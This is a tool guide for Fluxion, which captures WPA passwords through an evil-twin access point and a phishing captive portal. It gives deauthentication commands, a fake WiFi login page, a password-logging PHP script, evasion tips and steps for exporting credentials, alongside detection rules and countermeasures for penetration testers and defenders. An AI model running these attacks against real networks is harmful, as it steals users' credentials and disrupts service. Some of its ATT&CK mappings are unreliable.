---
tool_name: "fluxion"
display_name: "Fluxion"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "wifi_credential_capture"
install_command: "sudo apt install fluxion"
version: "6.28"
github_repo: "https://github.com/FluxionNetwork/fluxion"
kali_tools_page: "https://www.kali.org/tools/fluxion/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["wifi", "wpa", "phishing", "captive-portal", "evil-twin", "handshake", "social-engineering"]
related_tools: ["aircrack-ng", "wifite", "hostapd", "dnsmasq", "mdk4"]
---

# Fluxion - WiFi WPA Phishing via Evil Twin Captive Portal

## Chapter 1: Introduction & Overview

### What is Fluxion?

Fluxion is a security auditing and social-engineering research tool that captures WPA/WPA2-PSK wireless network passwords through a phishing attack. It creates a rogue access point that mimics the target network, deauthenticates legitimate clients, and serves a captive portal that prompts users for their WiFi password. The captured password is verified against a previously captured WPA handshake, and the attack terminates only when the correct key is submitted.

### History & Background

- **Original:** Linset by vk496 (Spanish security researcher)
- **Current:** Fluxion is a rewrite with enhanced functionality
- **License:** GPL-3.0
- **Language:** Bash, HTML, JavaScript, CSS
- **Dependencies:** aircrack-ng suite, hostapd, lighttpd, PHP, dnsmasq

Fluxion is considered the evolution of the "Evil Twin" WiFi attack. Unlike tools that simply capture the WPA 4-way handshake for offline cracking, Fluxion uses social engineering to trick users into entering their own password, making it effective against networks with strong passwords that would resist brute-force attacks.

### When to Use This Tool

- **Penetration testing:** Assess WiFi security of client organizations
- **Wireless security audits:** Test employee resistance to WiFi phishing
- **Red team engagements:** Gain wireless network access
- **CTF challenges:** WiFi-focused capture-the-flag challenges
- **Security research:** Study social engineering effectiveness

### When NOT to Use This Tool

- Against WiFi networks without authorization
- In public spaces without permission from the network owner
- To gain unauthorized network access
- Against WPA3-Only networks (requires different attack vector)

### Legal and Ethical Considerations

- **Written authorization required** — WiFi attacks are highly visible and potentially illegal
- **Deauthentication is illegal in many jurisdictions** — mdk4 aireplay-ng deauth attacks violate FCC regulations in the US
- **Public WiFi attacks** — even "free" WiFi networks require authorization from the operator
- **Physical proximity** — you must be within range of the target AP
- **Monitor mode required** — wireless adapter must support packet injection

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Evil Twin** | A rogue AP that impersonates a legitimate access point |
| **Captive Portal** | A web page that forces user interaction before granting network access |
| **WPA Handshake** | The 4-way authentication exchange used to verify WPA passwords |
| **Deauthentication** | Forcing clients to disconnect from the legitimate AP |
| **Social Engineering** | Tricking users into voluntarily providing their WiFi password |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux 2025.4 recommended)
- **Wireless Adapter:** External USB WiFi card with monitor mode and packet injection support
- **CPU:** Modern processor (attacks run multiple services simultaneously)
- **RAM:** 1 GB minimum
- **Disk Space:** ~25 MB
- **Root access:** Required for all operations

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install fluxion
```

#### Method 2: From Source

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh
```

The script auto-detects missing dependencies and prompts installation.

#### Method 3: Arch Linux

```bash
# Using BlackArch repository
pacman -S fluxion

# Or build from AUR
cd bin/arch
makepkg
```

### Dependencies Check

```bash
# Install check only (no attacks)
./fluxion.sh -i
```

**Required packages:**
- aircrack-ng, airmon-ng, airodump-ng, aireplay-ng
- hostapd (rogue AP)
- dnsmasq (DHCP + DNS)
- lighttpd + php-cgi (captive portal web server)
- mdk4 (deauthentication)
- nmap, macchanger, rfkill, iw

### Verify Installation

```bash
which fluxion
# or
fluxion --help
```

### Wireless Adapter Requirements

```bash
# Check adapter supports monitor mode
iw list | grep -A 10 "Supported interface modes"

# Must show: monitor

# Check packet injection support
aireplay-ng --test wlan0

# Recommended adapters:
# - Alfa AWUS036ACH (Realtek RTL8812AU)
# - Alfa AWUS036ACM (MediaTek MT7612U)
# - Panda PAU09 (Ralink RT5572)
```

---

## Chapter 3: Architecture & Operation

### Attack Flow

```
1. Scan for target wireless networks (airodump-ng)
2. Select target AP and capture WPA handshake (Handshake Snooper)
3. Launch Captive Portal attack
4. Fluxion spawns:
   a. Rogue AP (hostapd) - imitating the target SSID
   b. DNS server (dnsmasq) - redirecting all queries to captive portal
   c. Web server (lighttpd+PHP) - serving the captive portal page
   d. Deauth engine (mdk4) - kicking clients from legitimate AP
5. Victims connect to rogue AP (after being deauthed)
6. All HTTP traffic redirected to captive portal
7. User enters WiFi password on portal page
8. Password is verified against captured handshake
9. If correct: attack terminates, password is logged
10. If incorrect: error shown, user tries again
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Rogue Access Point | T1557.004 | Creating evil twin AP |
| Deauthentication | T1498.001 | Denial of service to force reconnection |
| Phishing | T1566 | Social engineering via captive portal |
| Credential Access | T1555 | Stealing WiFi pre-shared key |

### Component Architecture

```
┌─────────────────────────────────────────┐
│              FLUXION                     │
├─────────────┬───────────┬───────────────┤
│   hostapd   │  dnsmasq  │ lighttpd+PHP  │
│  (Rogue AP) │(DNS+DHCP) │ (Captive P.)  │
├─────────────┼───────────┼───────────────┤
│    mdk4     │  aircrack │  macchanger    │
│ (Deauth)    │(Handshake)│  (MAC Mask)    │
└─────────────┴───────────┴───────────────┘
```

### Captive Portal Flow

```
1. Client connects to rogue AP
2. DHCP assigns IP via dnsmasq
3. DNS resolves ALL domains to rogue AP IP
4. HTTP request intercepted by lighttpd
5. PHP page checks for password submission
6. If no password: show captive portal form
7. If password submitted: verify against handshake
8. If correct: log password, terminate attack
9. If incorrect: show error, re-prompt
```

---

## Chapter 4: Command Reference

### Starting Fluxion

#### Interactive Mode

```bash
sudo fluxion
```

**Explanation:** Launches the interactive TUI that guides you through the attack step by step.

#### Install Dependencies Only

```bash
sudo fluxion.sh -i
```

**Explanation:** Check and install all required dependencies without launching attacks.

### Attack Workflow (Interactive)

#### Step 1: Select Wireless Interface

```
Interface Selection
├── wlan0 (Alfa AWUS036ACH)
├── wlan1 (Built-in Intel)
└── [Rescan]
```

**Explanation:** Select the wireless adapter that supports monitor mode.

#### Step 2: Kill Conflicting Processes

Fluxion automatically runs:

```bash
sudo airmon-ng check kill
```

**Explanation:** Stops NetworkManager, wpa_supplicant, and other processes that interfere with monitor mode.

#### Step 3: Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
```

**Explanation:** Puts the selected adapter into monitor mode for packet capture.

#### Step 4: Scan for Target Networks

Fluxion launches airodump-ng to display available networks:

```
BSSID              CH  dBm  ENC   ESSID
00:11:22:33:44:55   6  -45  WPA2  CorporateWiFi
AA:BB:CC:DD:EE:FF  11  -62  WPA2  GuestNetwork
11:22:33:44:55:66   1  -78  WPA2  HomeRouter
```

**Explanation:** Select the target network by its ESSID or BSSID.

#### Step 5: Capture WPA Handshake

Fluxion uses the Handshake Snooper attack to capture the WPA 4-way handshake:

```
[*] Waiting for WPA handshake from target...
[+] Handshake captured!
```

**Explanation:** The handshake is necessary to verify passwords entered on the captive portal. Without it, Fluxion cannot validate whether the submitted password is correct.

#### Step 6: Select Captive Portal Attack

```
Attack Options
├── Captive Portal (Phishing)
├── Handshake Snooper (Deauth only)
└── [Back]
```

**Explanation:** Select the Captive Portal attack for the full phishing workflow.

#### Step 7: Configure Attack Parameters

```
ESSID: CorporateWiFi
Channel: 6
Interface: wlan0mon
Deauth method: mdk4
```

**Explanation:** Confirm attack settings before launching.

#### Step 8: Monitor Attack

```
[*] Rogue AP started on channel 6
[*] DNS server running on port 53
[*] Captive portal at http://192.168.1.1
[*] Deauth engine active
[*] Waiting for password submission...
```

**Explanation:** Watch the terminal for captured credentials and attack progress.

### Command-Line Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-h` | Show help | `fluxion -h` |
| `-i` | Install dependencies only | `fluxion.sh -i` |
| `-c` | Auto-channel mode | Not commonly used |
| `-a` | Auto-mode for attacks | Experimental |

### Captive Portal Customization

```bash
# Portal pages are located in:
ls /usr/share/fluxion/attacks/Captive\ Portal/sites/

# Custom portals can be added by placing HTML files in the sites directory
# Supported portals include:
# - English, Spanish, French, German, etc.
# - Brand-specific portals (Starbucks, airports, etc.)
```

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Corporate WiFi Assessment

**Setup:**

```bash
# Step 1: Launch Fluxion
sudo fluxion

# Step 2: Select interface and scan
# Step 3: Select "CorporateWiFi" (WPA2, CH 6)
# Step 4: Capture handshake (wait for client to connect)
# Step 5: Launch Captive Portal attack

# Result: Employees see "reconnection required" after deauth
# They enter the WiFi password on the portal
# Password is captured and verified
```

**Attack Details:**
- Deauth targets all clients connected to CorporateWiFi
- Portal displays corporate-branded login page
- Users think the network is experiencing issues
- Password capture reveals network security level

### Scenario 2: Public WiFi Security Test

```bash
# Target: "CoffeeShop_Free_WiFi"
# Many public WPA2 networks use simple passwords
# Fluxion can capture the password for authorized assessment

sudo fluxion
# Select target: CoffeeShop_Free_WiFi
# Capture handshake
# Launch Captive Portal with appropriate branding
```

**Key Insight:** Public WiFi networks with shared passwords are easy targets — the password is the same for all users, so one capture compromises everyone.

### Scenario 3: High-Security WPA2-Enterprise Bypass Attempt

```bash
# WPA2-Enterprise (802.1X) uses RADIUS, not PSK
# Fluxion cannot capture Enterprise credentials via captive portal
# But it can detect the network type and alert the operator

# Use for detection only:
airodump-ng wlan0mon | grep -i "WPA2"
# Look for "Authentication: PSK" vs "Authentication: 802.1X"
```

**Note:** Fluxion works against WPA2-PSK networks only. WPA2-Enterprise requires different attack vectors (e.g., hostapd-mana, EAP relay attacks).

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**WiFi-Level Detection:**
- Duplicate SSID with different BSSID (evil twin detection)
- Deauthentication flood patterns (mdk4 signature)
- Rogue AP signal strength anomalies

**Network-Level Detection:**
- DNS queries resolving to unexpected IPs
- Captive portal HTTP responses from unknown servers
- DHCP from unauthorized server

**Enterprise Detection:**
- Wireless Intrusion Prevention Systems (WIPS)
- 802.11 management frame monitoring
- SSID/BSSID tracking and correlation

### Evasion Techniques

1. **Match Signal Strength:** Position closer to target to match legitimate AP signal
2. **MAC Randomization:** Use macchanger to randomize rogue AP MAC address
3. **Channel Selection:** Match the target AP's channel exactly
4. **Timing:** Launch during high-traffic periods (e.g., office hours)
5. **Selective Deauth:** Target specific clients instead of broadcast deauth
6. **Custom Portals:** Use realistic captive portal pages (airport, hotel, corporate)

### Blue Team Countermeasures

- **WPA3-SAE:** Resistant to offline dictionary attacks
- **802.1X/WPA2-Enterprise:** Individual credentials, not shared PSK
- **Wireless IDS:** Deploy WIPS to detect evil twin APs
- **802.11w (PMF):** Protected Management Frames prevent deauthentication
- **Client isolation:** Prevent client-to-client traffic on WiFi
- **Certificate pinning:** Require server certificates for enterprise networks
- **User training:** Educate employees about WiFi phishing risks

---

## Chapter 7: Integration with Other Tools

### Aircrack-ng Suite Integration

Fluxion is built on top of the aircrack-ng suite:

```bash
# Handshake capture (Fluxion does this automatically)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Verify handshake quality
aircrack-ng handshake-01.cap

# Deauth (Fluxion uses mdk4, but aireplay-ng works too)
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon
```

### Hashcat for Offline Cracking

```bash
# If Fluxion captures the handshake but user doesn't enter password:
# Convert handshake to hashcat format
aircrack-ng -j converted handshake-01.cap

# Crack with hashcat
hashcat -m 22000 converted.hc22000 wordlist.txt
```

### Hostapd Configuration

```bash
# Fluxion generates hostapd config automatically
# Manual configuration for custom rogue AP:
cat > /tmp/hostapd.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=CorporateWiFi
channel=6
hw_mode=g
wmm_enabled=0
auth_algs=1
wpa=2
wpa_passphrase=CapturedPassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

hostapd /tmp/hostapd.conf
```

### Log Analysis

```bash
# Fluxion logs captured credentials
ls /tmp/fluxion-*/logs/

# Parse captured passwords
grep "PASSWORD:" /tmp/fluxion-*/logs/*.log

# Export to CSV
awk '{print $1","$2}' /tmp/fluxion-*/logs/*.log > wifi_creds.csv
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Wireless adapter not found**

```bash
# Check if adapter is detected
lsusb | grep -i wireless
ip link show

# Install drivers if needed
# For Realtek RTL8812AU:
sudo apt install realtek-rtl88xxau-dkms

# For MediaTek MT7612U:
sudo apt install dkms git
git clone https://github.com/aircrack-ng/mt7612u.git
cd mt7612u && make && sudo make install
```

**Issue: Monitor mode not working**

```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon
# Should show "Mode:Monitor"

# If interface doesn't appear:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Issue: Handshake not captured**

```bash
# Deauth clients to force handshake
sudo mdk4 wlan0mon d -b /tmp/targets.txt

# Or use aireplay-ng
sudo aireplay-ng --deauth 5 -a TARGET_BSSID wlan0mon

# Wait for clients to reconnect
# The handshake is captured passively during reconnection
```

**Issue: Captive portal not loading**

```bash
# Check dnsmasq is running
ps aux | grep dnsmasq

# Check lighttpd is running
ps aux | grep lighttpd

# Check PHP is working
php -v

# Restart services
sudo systemctl restart dnsmasq
sudo systemctl restart lighttpd

# Check firewall rules
sudo iptables -t nat -L -n
```

**Issue: Password not being verified**

```bash
# Ensure handshake was captured before launching portal
# Check handshake file exists and is valid
aircrack-ng /tmp/fluxion-*/handshake-01.cap

# The handshake must be complete (all 4 messages)
# Partial handshakes won't work for verification
```

**Issue: WSL/WSL2 incompatibility**

```bash
# Fluxion DOES NOT WORK on WSL or WSL2
# Windows Subsystem for Linux cannot access wireless network interfaces
# Use a native Linux installation or a VM with USB passthrough
```

### Debug Mode

```bash
# Run with verbose output
sudo fluxion --debug 2>&1 | tee fluxion_debug.log

# Check individual components
sudo hostapd -d /tmp/hostapd.conf
sudo dnsmasq --no-daemon --log-queries
```

### Service Management

```bash
# Stop all Fluxion services
sudo killall hostapd dnsmasq lighttpd mdk4

# Restart network manager
sudo systemctl restart NetworkManager

# Reset wireless interface
sudo airmon-ng stop wlan0mon
sudo systemctl restart networking
```

---

## Chapter 9: Captive Portal Customization

### Portal Templates

Fluxion ships with multiple captive portal templates:

```bash
# Portal template locations
ls /usr/share/fluxion/attacks/Captive\ Portal/sites/

# Available templates include:
# - English, Spanish, French, German, etc.
# - Brand-specific: Starbucks, airports, hotels
# - Generic WiFi login pages
# - Terms of service acceptance pages
```

### Custom Portal Creation

```bash
# Create custom portal directory
mkdir -p /usr/share/fluxion/attacks/Captive\ Portal/sites/custom/

# Create custom login page
cat > /usr/share/fluxion/attacks/Captive\ Portal/sites/custom/login.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Network Access Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
        }
        h1 { color: #333; text-align: center; margin-bottom: 20px; }
        p { color: #666; text-align: center; margin-bottom: 20px; }
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover { background: #5a6fd6; }
    </style>
</head>
<body>
    <div class="card">
        <h1>WiFi Authentication</h1>
        <p>Enter the network password to continue</p>
        <form method="POST" action="login">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF
```

### Portal Verification Script

```php
<?php
// login.php - Verify password against captured handshake
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'];
    $bssid =$_SESSION['target_bssid'];
    $handshake = $_SESSION['handshake_file'];

    // Use aircrack-ng to verify
    $cmd = "aircrack-ng -w /tmp/test_password.txt -b $bssid $handshake 2>&1";
    file_put_contents('/tmp/test_password.txt', $password);
    $output = shell_exec($cmd);

    if (strpos($output, 'KEY FOUND') !== false) {
        // Correct password
        echo json_encode(['status' => 'success', 'password' => $password]);
        // Log to file
        file_put_contents('/tmp/captured_passwords.log',
            date('Y-m-d H:i:s') . " BSSID=$bssid PASSWORD=$password\n",
            FILE_APPEND);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Incorrect password']);
    }
}
?>
```

---

## Chapter 10: Deauthentication Deep Dive

### mdk4 Deauth Methods

```bash
# Broadcast deauth (kick all clients)
sudo mdk4 wlan0mon d

# Targeted deauth (specific BSSID)
sudo mdk4 wlan0mon d -b TARGET_BSSID

# Continuous deauth (until stopped)
sudo mdk4 wlan0mon d -B TARGET_BSSID

# Deauth with custom interval
sudo mdk4 wlan0mon d -t TARGET_BSSID -s 10  # 10 second interval
```

### 802.11w (PMF) Considerations

```bash
# Protected Management Frames (PMF) prevent deauth attacks
# WPA3 mandates PMF; WPA2 makes it optional

# Check if target uses PMF
airodump-ng wlan0mon --bssid TARGET_BSSID
# Look for "MFP" or "PMF" in capabilities

# If PMF is enabled:
# - Deauth frames are ignored
# - Fluxion deauth will not work
# - Need alternative attack vector

# Workaround: Target clients that don't support PMF
# Some clients connect without PMF even if AP supports it
```

### Timing Considerations

```
Optimal deauth timing:
- Business hours: Higher client density, more chances
- After lunch: Users returning to desks, reconnecting
- Avoid: Late night, weekends (low traffic)

Deauth strategy:
1. Capture handshake first (passive or active)
2. Start deauth to kick clients
3. Clients reconnect to rogue AP (evil twin)
4. Client enters password on captive portal
5. Password verified against handshake
6. Attack terminates on correct password
```

---

## Chapter 11: Handshake Capture Techniques

### Passive Capture

```bash
# Wait for natural handshakes
airodump-ng -c 6 --bssid TARGET_BSSID -w /tmp/handshake wlan0mon

# Clients naturally connect/disconnect
# Handshake is captured when they reconnect
# May take minutes to hours
```

### Active Deauth Capture

```bash
# Force handshake by deauthing clients
# Step 1: Start capture
airodump-ng -c 6 --bssid TARGET_BSSID -w /tmp/handshake wlan0mon &

# Step 2: Deauth specific client
aireplay-ng --deauth 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Step 3: Verify handshake
aircrack-ng /tmp/handshake-01.cap
# Should show "1 handshake" with BSSID
```

### EAPOL Frame Capture

```bash
# The WPA 4-way handshake uses EAPOL frames
# Capture with filter
sudo tcpdump -i wlan0mon -w eapol_capture.pcap "ether proto 0x888e"

# Analyze EAPOL frames
tshark -r eapol_capture.pcap -Y "eapol"
```

### Handshake Quality

```bash
# A complete handshake requires all 4 EAPOL messages
# Minimum for password verification: messages 1 and 2

# Verify handshake completeness
aircrack-ng handshake.cap 2>&1 | grep "handshake"

# If handshake is partial:
# - Try deauthing again
# - Wait for natural reconnection
# - Target different clients
```

---

## Chapter 12: WPA3 Considerations

### WPA3-SAE Attacks

```
WPA3-SAE (Simultaneous Authentication of Equals) replaces WPA2-PSK:
- Resistant to offline dictionary attacks
- Uses Dragonfly key exchange
- No capture-and-crack workflow

Fluxion limitations against WPA3:
- Captive portal attack still works (social engineering)
- Deauth attacks may be blocked by PMF
- Handshake capture is different (SAE commit/confirm)
```

### WPA3 Transition Mode

```bash
# Many APs run in WPA2/WPA3 transition mode
# WPA2 clients connect with PSK (vulnerable)
# WPA3 clients use SAE (resistant)

# Identify transition mode
airodump-ng wlan0mon | grep -i "wpa3\|sae\|transition"

# Attack strategy:
# 1. Target WPA2 clients specifically
# 2. Deauth to force reconnection
# 3. WPA2 clients fall back to PSK
# 4. Capture WPA2 handshake
```

### OWE (Opportunistic Wireless Encryption)

```bash
# OWE replaces open networks (no password)
# Provides encryption but no authentication
# Vulnerable to passive sniffing

# Identify OWE networks
airodump-ng wlan0mon | grep -i "owe"

# OWE networks don't need Fluxion
# Standard MITM attacks work
```

---

## Chapter 13: Multi-AP and Enterprise Scenarios

### Multi-BSSID Attack

```bash
# Some APs broadcast multiple SSIDs
# Target all SSIDs from same physical AP

# Scan for all BSSIDs
airodump-ng wlan0mon | grep "TARGET_VENDOR"

# Attack each SSID
for bssid in 00:11:22:33:44:55 00:11:22:33:44:56; do
    echo "[*] Targeting $bssid"
    sudo fluxion --bssid "$bssid"
done
```

### Enterprise WiFi Assessment

```bash
# WPA2-Enterprise uses 802.1X/RADIUS
# Fluxion cannot capture enterprise credentials via captive portal

# Alternative attacks for enterprise WiFi:
# 1. Evil twin + EAP relay (hostapd-mana)
# 2. Credential capture from RADIUS logs
# 3. Default credential testing
# 4. Certificate-based attacks

# Detect enterprise vs PSK
airodump-ng wlan0mon --bssid TARGET | grep -i "auth"
# PSK: Authentication: Open System
# Enterprise: Authentication: 802.1X
```

---

## Chapter 14: Detection and Defense

### Evil Twin Detection

```
Detection methods:
1. WIPS (Wireless Intrusion Prevention System)
   - RF fingerprinting
   - Beacon analysis
   - Signal strength comparison

2. Client-side detection:
   - Certificate pinning
   - AP reputation databases
   - Signal strength anomalies

3. Network-level detection:
   - Duplicate BSSID alerts
   - Deauth flood detection
   - Captive portal detection
```

### Blue Team Countermeasures

```bash
# 1. Deploy WPA3-SAE
# Mandatory PMF prevents deauth
# SAE prevents offline dictionary attacks

# 2. Enable 802.11w (PMF) on WPA2
# hostapd.conf:
# ieee80211w=2  # Required
# wpa=2
# wpa_key_mgmt=WPA-PSK-SHA256

# 3. Deploy WIPS
# Aruba, Cisco, Mist wireless IDS
# Detects evil twins automatically

# 4. Client education
# Don't connect to unknown networks
# Verify SSID before entering credentials
# Use VPN on public WiFi

# 5. Network segmentation
# Isolate WiFi from sensitive resources
# Use separate VLANs for WiFi

# 6. Monitor for deauth floods
# Alert on excessive deauth frames
# Use IDS signatures for mdk4/aireplay
```

### Detection Snort/Suricata Rules

```
# Detect deauthentication flood
alert wifi any any -> any any (
  msg:"WiFi Deauth Flood";
  wifi.fc.type_subtype: 0x0c;
  threshold:type both, track by_src, count 10, seconds 5;
  sid:1000001; rev:1;
)

# Detect duplicate SSID (evil twin)
alert wifi any any -> any any (
  msg:"Possible Evil Twin - Duplicate SSID";
  wifi.mgmt.ssid: "TargetSSID";
  threshold:type both, track by_src, count 2, seconds 10;
  sid:1000002; rev:1;
)
```

---

## Resources

- **GitHub:** https://github.com/FluxionNetwork/fluxion
- **Website:** https://fluxionnetwork.github.io/fluxion/
- **Discord:** https://discord.gg/G43gptk
- **Kali Documentation:** https://www.kali.org/tools/fluxion/
- **FAQ:** https://github.com/FluxionNetwork/fluxion/wiki/FAQ
- **Captive Portal Guide:** https://github.com/FluxionNetwork/fluxion/wiki/Captive-Portal-Attack
- **Aircrack-ng:** https://www.aircrack-ng.org
- **hostapd:** https://w1.fi/hostapd/
- **WPA3 Specification:** https://www.wi-fi.org/discover-wi-fi/security
- **IEEE 802.11w:** https://standards.ieee.org/standard/802_11w-2009.html
- **SAE Protocol:** https://tools.ietf.org/html/rfc7664
